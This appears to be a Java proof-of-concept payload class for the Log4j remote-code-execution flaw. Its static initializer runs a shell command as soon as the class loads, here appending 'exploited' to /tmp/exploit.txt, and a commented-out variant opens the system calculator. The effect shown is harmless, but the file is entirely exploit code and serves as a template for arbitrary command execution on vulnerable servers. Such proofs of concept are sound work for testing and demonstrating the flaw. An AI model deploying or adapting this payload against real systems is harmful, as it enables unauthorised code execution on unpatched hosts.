public class Log4jpoc {
    public Log4jpoc() {}
    static {
        try {
            /*String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                    ? new String[]{"cmd.exe","/c", "calc.exe"}
                    : new String[]{"open","/System/Applications/Calculator.app"};
            java.lang.Runtime.getRuntime().exec(cmds).waitFor();*/
            System.out.println("Exploited");
            String[] cmd = {
                "/bin/sh",
                "-c",
                "echo 'exploited' >> /tmp/exploit.txt"
            };
            Process p = Runtime.getRuntime().exec(cmd);
            
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        Log4jpoc e = new Log4jpoc();
    }
}